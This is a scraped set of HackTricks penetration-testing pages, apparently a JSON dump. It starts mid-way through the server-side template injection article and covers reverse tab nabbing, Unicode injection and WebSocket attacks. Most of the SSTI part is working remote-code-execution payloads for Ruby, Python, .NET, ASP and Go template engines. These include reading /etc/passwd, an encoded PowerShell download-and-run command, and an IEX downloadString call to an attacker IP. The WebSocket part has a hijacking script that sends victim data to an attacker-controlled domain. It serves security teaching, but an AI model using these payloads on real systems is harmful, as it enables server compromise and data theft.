information\n‚Äã\nhttp://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine\n‚Äã\nERB (Ruby)\n{{7*7}} = {{7*7}}\n${7*7} = ${7*7}\n<%= 7*7 %> = 49\n<%= foobar %> = Error\n<%=\nsystem\n(\n\"whoami\"\n)\n%>\n#Execute code\n<%=\nDir\n.\nentries\n(\n'/'\n)\n%>\n#List folder\n<%=\nFile\n.\nopen\n(\n'/etc/passwd'\n).\nread\n%>\n#Read file\n‚Äã\n<%=\nsystem\n(\n'cat /etc/passwd'\n)\n%>\n<%=\n`ls\n/\n`\n%>\n<%=\nIO\n.\npopen\n(\n'ls /'\n).\nreadlines\n()\n%>\n<%\nrequire\n'open3'\n%><%\n@a\n,\n@b\n,\n@c\n,\n@d\n=\nOpen3\n.\npopen3\n(\n'whoami'\n)\n%><%=\n@b\n.\nreadline\n()\n%>\n<%\nrequire\n'open4'\n%><%\n@a\n,\n@b\n,\n@c\n,\n@d\n=\nOpen4\n.\npopen4\n(\n'whoami'\n)\n%><%=\n@c\n.\nreadline\n()\n%>\nMore information\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby\n‚Äã\nSlim (Ruby)\n{ 7 * 7 }\n{ %x|env| }\nMore information\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby\n‚Äã\nPython\nCheck out the following page to learn tricks about\narbitrary command execution bypassing sandboxes\nin python:\nBypass Python sandboxes\nTornado (Python)\n{{7*7}} = 49\n${7*7} = ${7*7}\n{{foobar}} = Error\n{{7*'7'}} = 7777777\n{\n%\nimport\nfoobar\n%\n}\n=\nError\n{\n%\nimport\nos\n%\n}\n‚Äã\n{\n%\nimport\nos\n%\n}\n‚Äã\n‚Äã\n‚Äã\n‚Äã\n{{\nos\n.\nsystem\n(\n'whoami'\n)}}\n{{\nos\n.\nsystem\n(\n'whoami'\n)}}\nMore information\nJinja2 (Python)\n‚Äã\nOfficial website\n‚Äã\nJinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.\n{{7*7}} = Error\n${7*7} = ${7*7}\n{{foobar}} Nothing\n{{4*4}}[[5*5]]\n{{7*'7'}} = 7777777\n{{config}}\n{{config.items()}}\n{{settings.SECRET_KEY}}\n{{settings}}\n<div data-gb-custom-block data-tag=\"debug\"></div>\n{\n%\ndebug\n%\n}\n‚Äã\n‚Äã\n‚Äã\n{{\nsettings\n.\nSECRET_KEY\n}}\n{{\n4\n*\n4\n}}[[\n5\n*\n5\n]]\n{{\n7\n*\n'7'\n}}\nwould result\nin\n7777777\nJinja2 - Template format\n{\n%\nextends\n\"layout.html\"\n%\n}\n{\n%\nblock body\n%\n}\n<\nul\n>\n{\n%\nfor\nuser\nin\nusers\n%\n}\n<\nli\n><\na href\n=\n\"{{ user.url }}\"\n>\n{{\nuser\n.\nusername\n}}\n</\na\n></\nli\n>\n{\n%\nendfor\n%\n}\n</\nul\n>\n{\n%\nendblock\n%\n}\n‚Äã\n‚Äã\n‚Äã\nRCE not dependant from\n__builtins__\n:\n{{\nself\n.\n_TemplateReference__context\n.\ncycler\n.\n__init__\n.\n__globals__\n.\nos\n.\npopen\n(\n'id'\n).\nread\n()\n}}\n{{\nself\n.\n_TemplateReference__context\n.\njoiner\n.\n__init__\n.\n__globals__\n.\nos\n.\npopen\n(\n'id'\n).\nread\n()\n}}\n{{\nself\n.\n_TemplateReference__context\n.\nnamespace\n.\n__init__\n.\n__globals__\n.\nos\n.\npopen\n(\n'id'\n).\nread\n()\n}}\n‚Äã\n# Or in the shotest versions:\n{{\ncycler\n.\n__init__\n.\n__globals__\n.\nos\n.\npopen\n(\n'id'\n).\nread\n()\n}}\n{{\njoiner\n.\n__init__\n.\n__globals__\n.\nos\n.\npopen\n(\n'id'\n).\nread\n()\n}}\n{{\nnamespace\n.\n__init__\n.\n__globals__\n.\nos\n.\npopen\n(\n'id'\n).\nread\n()\n}}\nMore details about how to abuse Jinja\n:\nJinja2 SSTI\nMako (Python)\n<%\nimport\nos\nx\n=\nos\n.\npopen\n(\n'id'\n).\nread\n()\n%>\n$\n{\nx\n}\nRazor (.Net)\n@(2+2) <= Success\n@() <= Success\n@(\"{{code}}\") <= Success\n@ <=Success\n@{} <= ERROR!\n@{ <= ERRROR!\n@(1+2)\n@( //C#Code )\n@System.Diagnostics.Process.Start(\"cmd.exe\",\"/c echo RCE > C:/Windows/Tasks/test.txt\");\n@System.Diagnostics.Process.Start(\"cmd.exe\",\"/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==\");\nThe .NET\nSystem.Diagnostics.Process.Start\nmethod can be used to start any process on the server and thus create a webshell. You can find a vulnerable webapp example in\nhttps://github.com/cnotin/RazorVulnerableApp\n‚Äã\nMore information\n‚Äã\nhttps://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/\n‚Äã\n‚Äã\nhttps://www.schtech.co.uk/razor-pages-ssti-rce/\n‚Äã\nASP\n<%= 7*7 %>\n= 49\n<%= \"foo\" %>\n= foo\n<%= foo %>\n= Nothing\n<%= response.write(date()) %>\n= <Date>\n<\n%\n=\nCreateObject\n(\n\"Wscript.Shell\"\n)\n.exec\n(\n\"powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')\"\n)\n.StdOut.ReadAll\n()\n%\n>\nMore Information\n‚Äã\nhttps://www.w3schools.com/asp/asp_examples.asp\n‚Äã\nMojolicious (Perl)\nEven if it's perl it uses tags like ERB in Ruby.\n<%= 7*7 %> = 49\n<%= foobar %> = Error\n<%= perl code %>\n<% perl code %>\nSSTI in GO\nThe way to confirm that the template engine used in the backed is Go you can use these payloads:\n{{ . }}\n= data struct being passed as input to the template\nIf the passed data is an object that contains the attribute Password for example, the previous payload would leak it, but you could also do:\n{{ .Password }}\n{{printf \"%s\" \"ssti\" }}\n= should output the string ssti in the response\n{{html \"ssti\"}}\n,\n{{js \"ssti\"}}\n= These are a few other payloads which should output the string \"ssti\" without the trailing words \"js\" or \"html\". You can refer to more keywords in the engine\nhere\n.\nXSS exploitation\nIf the server is\nusing the text/template\npackage, XSS is very easy to achieve by\nsimply\nproviding your\npayload\nas input. However, that is\nnot the case with html/template\nas itHTMLencodes the response:\n{{\"<script>alert(1)</script>\"}}\n-->\n&lt;script&gt;alert(1)&lt;/script&gt;\nHowever, Go allows to\nDEFINE\na whole\ntemplate\nand then\nlater call it\n. The payload will be something like:\n{{define \"T1\"}}<script>alert(1)</script>{{end}} {{template \"T1\"}}\nRCE Exploitation\nThe documentation for both the html/template module can be found\nhere\n, and the documentation for the text/template module can be found\nhere\n, and yes, they do vary, a lot. For example, in\ntext/templat\ne, you can\ndirectly call any public function with the ‚Äúcall‚Äù value\n, this however, is not the case with html/template.\nIf you want to find a RCE in go via SSTI, you should know that as you can access the given object to the template with\n{{ . }}\n, you can also\ncall the objects methods\n. So, imagine that the\npassed object has a method called System\nthat executes the given command, you could abuse it with:\n{{ .System \"ls\" }}\nTherefore, you will probably\nneed the source code\n. A potential source code for something like that will look like:\nfunc\n(\np Person\n)\nSecret\n(\ntest\nstring\n)\nstring\n{\nout\n,\n_\n:=\nexec\n.\nCommand\n(\ntest\n).\nCombinedOutput\n()\nreturn\nstring\n(\nout\n)\n}\nMore information\n‚Äã\nhttps://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html\n‚Äã\n‚Äã\nhttps://www.onsecurity.io/blog/go-ssti-method-research/\n‚Äã\nMore Exploits\nCheck the rest of\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection\nfor more exploits. Also you can find interesting tags information in\nhttps://github.com/DiogoMRSilva/websitesVulnerableToSSTI\n‚Äã\nBlackHat PDF\nEN-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-BlackHat-15.pdf\n2MB\nPDF\nRelated Help\nIf you think it could be useful, read:\n‚Äã\nFlask tricks\n‚Äã\n‚Äã\nPython magic functions\n‚Äã\nTools\nGitHub - epinna/tplmap: Server-Side Template Injection and Code Injection Detection and Exploitation Tool\nGitHub\nBrute-Force Detection List\nAuto_Wordlists/ssti.txt at main ¬∑ carlospolop/Auto_Wordlists\nGitHub\nPractice & References\n‚Äã\nhttps://portswigger.net/web-security/server-side-template-injection/exploiting\n‚Äã\n‚Äã\nhttps://github.com/DiogoMRSilva/websitesVulnerableToSSTI\n‚Äã\n‚Äã\nhttps://portswigger.net/web-security/server-side-template-injection\n‚Äã\n‚Äã‚Äã‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nCloud SSRF\nNext\nEL - Expression Language\nLast modified\n4mo ago"
    },
    {
        "title": "Reverse Tab Nabbing",
        "url": "https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing",
        "text": "Reverse Tab Nabbing\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nDescription\nIn a situation where an\nattacker\ncan\ncontrol\nthe\nhref\nargument of an\n<a\ntag with the attribute\ntarget=\"_blank\" rel=\"opener\"\nthat is going to be clicked by a victim, the\nattacker\npoint\nthis\nlink\nto a web under his control (a\nmalicious\nwebsite\n). Then, once the\nvictim clicks\nthe link and access the attackers website, this\nmalicious\nwebsite\nwill be able to\ncontrol\nthe\noriginal\npage\nvia the javascript object\nwindow.opener\n.\nIf the page doesn't have\nrel=\"opener\"\nbut contains\ntarget=\"_blank\"\nit also doesn't have\nrel=\"noopener\"\nit might be also vulnerable.\nA regular way to abuse this behaviour would be to\nchange the location of the original web\nvia\nwindow.opener.location = https://attacker.com/victim.html\nto a web controlled by the attacker that\nlooks like the original one\n, so it can\nimitate\nthe\nlogin\nform\nof the original website and ask for credentials to the user.\nHowever, note that as the\nattacker now can control the window object of the original website\nhe can abuse it in other ways to perform\nstealthier attacks\n(maybe modifying javascript events to ex-filtrate info to a server controlled by him?)\nOverview\nWith back link\nLink between parent and child pages when prevention attribute is not used:\nWithout back link\nLink between parent and child pages when prevention attribute is used:\nExamples\nCreate the following pages in a folder and run a web server with\npython3 -m http.server\nThen,\naccess\nhttp://127.0.0.1:8000/\nvulnerable.html,\nclick\non the link and note how the\noriginal\nwebsite\nURL\nchanges\n.\nvulnerable.html\n<!\nDOCTYPE\nhtml\n>\n<\nhtml\n>\n<\nbody\n>\n<\nh1\n>\nVictim Site\n</\nh1\n>\n<\na\nhref\n=\n\"\nhttp://127.0.0.1:8000/malicious.html\n\"\ntarget\n=\n\"\n_blank\n\"\nrel\n=\n\"\nopener\n\"\n>\nControlled by the attacker\n</\na\n>\n</\nbody\n>\n</\nhtml\n>\nmalicious.html\n<!\nDOCTYPE\nhtml\n>\n<\nhtml\n>\n<\nbody\n>\n<\nscript\n>\nwindow\n.\nopener\n.\nlocation\n=\n\"http://127.0.0.1:8000/malicious_redir.html\"\n;\n</\nscript\n>\n</\nbody\n>\n</\nhtml\n>\nmalicious_redir.html\n<!\nDOCTYPE\nhtml\n>\n<\nhtml\n>\n<\nbody\n>\n<\nh1\n>\nNew Malicious Site\n</\nh1\n>\n</\nbody\n>\n</\nhtml\n>\nAccessible properties\nThe malicious site can only access to the following properties from the\nopener\njavascript object reference (that is in fact a reference to a\nwindow\njavascript class instance) in case of\ncross origin\n(cross domains) access:\nopener.closed\n: Returns a boolean value indicating whether a window has been closed or not.\nopener.frames\n: Returns all iframe elements in the current window.\nopener.length\n: Returns the number of iframe elements in the current window.\nopener.opener\n: Returns a reference to the window that created the window.\nopener.parent\n: Returns the parent window of the current window.\nopener.self\n: Returns the current window.\nopener.top\n: Returns the topmost browser window.\nIf the domains are the same then the malicious site can access all the properties exposed by the\nwindow\njavascript object reference.\nPrevention\nPrevention information are documented into the\nHTML5 Cheat Sheet\n.\nReferences\nReverse Tabnabbing Software Attack | OWASP Foundation\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nJinja2 SSTI\nNext\n- Pentesting Web\nUnicode Injection\nLast modified\n6mo ago"
    },
    {
        "title": "Unicode Injection",
        "url": "https://book.hacktricks.xyz/pentesting-web/unicode-injection",
        "text": "Unicode Injection\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nIntroduction\nDepending on how the back-end/front-end is behaving when it\nreceives weird unicode characters\nan attacker might be able to\nbypass protections and inject arbitrary characters\nthat could be used to\nabused injection vulnerabilities\nsuch as XSS or SQLi.\nUnicode Normalization\nUnicode normalization occurs when\nunicode characters are normalized to ascii characters\n.\nOne common scenario of this type of vulnerability occurs when the system is\nmodifying\nsomehow the\ninput\nof the user\nafter having checked it\n. For example, in some languages a simple call to make the\ninput uppercase or lowercase\ncould normalize the given input and the\nunicode will be transformed into ASCII\ngenerating new characters.\nFor more info check:\nUnicode Normalization\n\\u\nto\n%\nUnicode characters are usually represented with the\n\\u\nprefix\n. For example the char\n„±ã\nis\n\\u3c4b\n(\ncheck it here\n). If a backend\ntransforms\nthe prefix\n\\u\nin\n%\n, the resulting string will be\n%3c4b\n, which URL decoded is:\n<4b\n. And, as you can see, a\n<\nchar is injected\n.\nYou could use this technique to\ninject any kind of char\nif the backend is vulnerable.\nCheck\nhttps://unicode-explorer.com/\nto find the chars you need.\nThis vuln actually comes from a vulnerability a researcher found, for a more in depth explanation check\nhttps://www.youtube.com/watch?v=aUsAHb0E7Cg\n‚Äã\nEmoji Injection\nBack-ends something behaves weirdly when they\nreceives emojis\n. That's what happened in\nthis writeup\nwhere the researcher managed to achieve a XSS with a payload such as:\nüíãimg src=x onerror=alert(document.domain)//üíõ\nIn this case, the error was that the server after removing the malicious characters\nconverted the UTF-8 string from Windows-1252 to UTF-8\n(basically the input encoding and the convert from encoding mismatched). Then this does not give a proper < just a weird unicode one:\n‚Äπ\n``So they took this output and\nconverted again now from UTF-8 ot ASCII\n. This\nnormalized\nthe\n‚Äπ\nto\n<\nthis is how the exploit could work on that system.\nThis is what happened:\n<?php\n‚Äã\n$str\n=\nisset\n(\n$_GET\n[\n\"str\"\n])\n?\nhtmlspecialchars\n(\n$_GET\n[\n\"str\"\n])\n:\n\"\"\n;\n‚Äã\n$str\n=\niconv\n(\n\"Windows-1252\"\n,\n\"UTF-8\"\n,\n$str\n);\n$str\n=\niconv\n(\n\"UTF-8\"\n,\n\"ASCII//TRANSLIT\"\n,\n$str\n);\n‚Äã\necho\n\"String: \"\n.\n$str\n;\nEmoji lists:\n‚Äã\nhttps://github.com/iorch/jakaton_feminicidios/blob/master/data/emojis.csv\n‚Äã\n‚Äã\nhttps://unicode.org/emoji/charts-14.0/full-emoji-list.html\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nReverse Tab Nabbing\nNext\nUnicode Normalization\nLast modified\n6mo ago"
    },
    {
        "title": "WebSocket Attacks",
        "url": "https://book.hacktricks.xyz/pentesting-web/websocket-attacks",
        "text": "WebSocket Attacks\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nWhat are WebSockets\nWebSocket connections are initiated over\nHTTP\nand are typically\nlong-lived\n. Messages can be sent in\neither direction at any time\nand are not transactional in nature. The connection will normally stay open and idle until either the client or the server is ready to send a message.\nWebSockets are particularly useful in situations where\nlow-latency or server-initiated messages\nare required, such as real-time feeds of financial data.\nHow are WebSocket connections established?\n(Here you will find a summary but a\nmore detailed guide about how a web socket connection\nis created can be found\nhere\n).\nWebSocket connections are normally created using client-side JavaScript like the following:\nvar\nws\n=\nnew\nWebSocket\n(\n\"wss://normal-website.com/ws\"\n);\nThe\nwss\nprotocol establishes a WebSocket over an encrypted\nTLS\nconnection, while the\nws\nprotocol uses an\nunencrypted\nconnection.\nTo establish the connection, the browser and server perform a WebSocket handshake over HTTP. The browser issues a WebSocket handshake request like the following:\nGET\n/\nchat\nHTTP\n/\n1.1\nHost\n:\nnormal\n-\nwebsite\n.\ncom\nSec\n-\nWebSocket\n-\nVersion\n:\n13\nSec\n-\nWebSocket\n-\nKey\n:\nwDqumtseNBJdhkihL6PW7w\n==\nConnection\n:\nkeep\n-\nalive\n,\nUpgrade\nCookie\n:\nsession\n=\nKOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2\nUpgrade\n:\nwebsocket\nIf the server accepts the connection, it returns a WebSocket handshake response like the following:\nHTTP\n/\n1.1\n101\nSwitching Protocols\nConnection\n:\nUpgrade\nUpgrade\n:\nwebsocket\nSec\n-\nWebSocket\n-\nAccept\n:\n0FFP\n+\n2nmNIf\n/\nh\n+\n4BP36k9uzrYGk\n=\nAt this point, the network connection remains open and can be used to send WebSocket messages in either direction.\nNote\nSeveral\nfeatures\nof the WebSocket\nhandshake\nmessages are worth noting:\nThe\nConnection\nand\nUpgrade\nheaders in the request and response\nindicate\nthat this is a\nWebSocket handshake\n.\nThe\nSec-WebSocket-Version\nrequest header specifies the\nWebSocket protocol version\nthat the client wishes to use. This is typically\n13\n.\nThe\nSec-WebSocket-Key\nrequest header contains a Base64-encoded\nrandom value\n, which should be randomly generated in each handshake request.\nThe\nSec-WebSocket-Accept\nresponse header contains a hash of the value submitted in the\nSec-WebSocket-Key\nrequest header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.\nThe\nSec-WebSocket-Key\nheader contains a\nrandom value\nto prevent errors from caching proxies, and\nis not used for authentication or session handling purposes\n(\nIt's not a CSRF token\n).\nLinux console\nYou can use\nwebsocat\nto establish a raw connection with a websocket.\nwebsocat\n--insecure\nwss://10.10.10.10:8000\n-v\nOr to create a websocat server:\nwebsocat\n-s\n0.0\n.0.0:8000\n#Listen in port 8000\nMitM websocket connections\nIf you find that clients are connected to a\nHTTP websocket\nfrom your current local network you could try an\nARP Spoofing Attack\nto perform a MitM attack between the client and the server.\nOnce the client is trying to connect to you can then use:\nwebsocat\n-E\n--insecure\n--text\nws-listen:0.0.0.0:8000 wss://10.10.10.10:8000\n-v\nWebsockets enumeration\nYou can use the\ntool\nhttps://github.com/PalindromeLabs/STEWS\nto discover, fingerprint and search for known\nvulnerabilities\nin websockets automatically.\nWebsocket Debug tools\nBurp Suite\nsupports MitM websockets communication in a very similar way it does it for regular HTTP communication.\nThe\nsocketsleuth\nBurp Suite extension\nwill allow you to manage better Websocket communications in Burp by getting the\nhistory\n, setting\ninterception rules\n, using\nmatch and replace\nrules, using\nIntruder\nand\nAutoRepeater.\n‚Äã\nWSSiP\n:\nShort for \"\nWebSocket/Socket.io Proxy\n\", this tool, written in Node.js, provides a user interface to\ncapture, intercept, send custom\nmessages and view all WebSocket and Socket.IO communications between the client and server.\n‚Äã\nwsrepl\nis an\ninteractive websocket REPL\ndesigned specifically for penetration testing. It provides an interface for observing\nincoming websocket messages and sending new ones\n, with an easy-to-use framework for\nautomating\nthis communication.\n‚Äã\nhttps://websocketking.com/\nit's a\nweb to communicate\nwith other webs using\nwebsockets\n.\n‚Äã\nhttps://hoppscotch.io/realtime/websocket\namong other types of communications/protocols, it provides a\nweb to communicate\nwith other webs using\nwebsockets.\nWebsocket Lab\nIn\nBurp-Suite-Extender-Montoya-Course\nyou have a code to launch a web using websockets and in\nthis post\nyou can find an explanation.\nCross-site WebSocket hijacking (CSWSH)\nAlso known as\ncross-origin WebSocket hijacking\n.\nIt is a\nCross-Site Request Forgery (CSRF)\non a WebSocket handshake.\nIt arises when the\nWebSocket handshake\nrequest relies solely on\nHTTP cookies\nfor session handling and does\nnot contain any CSRF tokens\nor other unpredictable values.\nAn attacker can create a\nmalicious web page\non their own domain which\nestablishes a cross-site WebSocket\nconnection to the vulnerable application. The application will handle the connection in the\ncontext of the victim user's session\nwith the application.\nSimple Attack\nNote that when\nestablishing\na\nwebsocket\nconnection the\ncookie\nis\nsent\nto the server. The\nserver\nmight be using it to\nrelate\neach\nspecific\nuser\nwith his\nwebsocket\nsession based on the sent cookie\n.\nThen, if for\nexample\nthe\nwebsocket\nserver\nsends back the history of the conversation\nof a user if a msg with \"\nREADY\"\nis sent, then a\nsimple XSS\nestablishing the connection (the\ncookie\nwill be\nsent\nautomatically\nto authorise the victim user)\nsending\n\"\nREADY\n\" will be able to\nretrieve\nthe history of the\nconversation\n.:\n<\nscript\n>\nwebsocket\n=\nnew\nWebSocket\n(\n'wss://your-websocket-URL'\n)\nwebsocket\n.\nonopen\n=\nstart\nwebsocket\n.\nonmessage\n=\nhandleReply\nfunction\nstart\n(\nevent\n)\n{\nwebsocket\n.\nsend\n(\n\"READY\"\n);\n//Send the message to retreive confidential information\n}\nfunction\nhandleReply\n(\nevent\n)\n{\n//Exfiltrate the confidential information to attackers server\nfetch\n(\n'https://your-collaborator-domain/?'\n+\nevent\n.\ndata\n,\n{\nmode\n:\n'no-cors'\n})\n}\n</\nscript\n>\nCross Origin + Cookie with a different subdomain\nIn this blog post\nhttps://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/\nthe attacker managed to\nexecute arbitrary Javascript in a subdomain\nof the domain where the web socket communication was occurring. Because it was a\nsubdomain\n, the\ncookie\nwas being\nsent\n, and because the\nWebsocket didn't check the Origin properly\n, it was possible to communicate with it and\nsteal tokens from it\n.\nStealing data from user\nCopy the web application you want to impersonate (the .html files for example) and inside the script where the websocket communication is occurring add this code:\n//This is the script tag to load the websocket hooker\n<\nscript src\n=\n'wsHook.js'\n></\nscript\n>\n‚Äã\n//These are the functions that are gonig to be executed before a message\n//is sent by the client or received from the server\n//These code must be between some <script> tags or inside a .js file\nwsHook\n.\nbefore\n=\nfunction\n(\ndata\n,\nurl\n)\n{\nvar\nxhttp\n=\nnew\nXMLHttpRequest\n();\nxhttp\n.\nopen\n(\n\"GET\"\n,\n\"client_msg?m=\"\n+\ndata\n,\ntrue\n);\nxhttp\n.\nsend\n();\n}\nwsHook\n.\nafter\n=\nfunction\n(\nmessageEvent\n,\nurl\n,\nwsObject\n)\n{\nvar\nxhttp\n=\nnew\nXMLHttpRequest\n();\nxhttp\n.\nopen\n(\n\"GET\"\n,\n\"server_msg?m=\"\n+\nmessageEvent\n.\ndata\n,\ntrue\n);\nxhttp\n.\nsend\n();\nreturn\nmessageEvent\n;\n}\nNow download the\nwsHook.js\nfile from\nhttps://github.com/skepticfx/wshook\nand\nsave it inside the folder with the web files\n.\nExposing the web application and making a user connect to it you will be able to steal the sent and received messages via websocket:\nsudo python3\n-\nm http\n.\nserver\n80\nRace Conditions\nRace Conditions in WebSockets are also a thing,\ncheck this information to learn more\n.\nOther vulnerabilities\nAs Web Sockets are a mechanism to\nsend data to server side and client side\n, depending on how the server and client handles the information,\nWeb Sockets can be used to exploit several other vulnerabilities like XSS, SQLi or any other common web vuln using input of s user from a websocket.\nWebSocket Smuggling\nThis vulnerability could allow you to\nbypass reverse proxies restrictions\nby making them believe that a\nwebsocket communication was stablished\n(even if it isn't true). This could allow an attacker to\naccess hidden endpoints\n. For more information check the following page:\nUpgrade Header Smuggling\nReferences\nTesting for WebSockets security vulnerabilities | Web Security Academy\nWebSecAcademy\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nUnicode Normalization\nNext\n- Pentesting Web\nWeb Tool - WFuzz\nLast modified\n1mo ago"
    },
    {
        "title": "Web Tool - WFuzz",
        "url": "https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz",
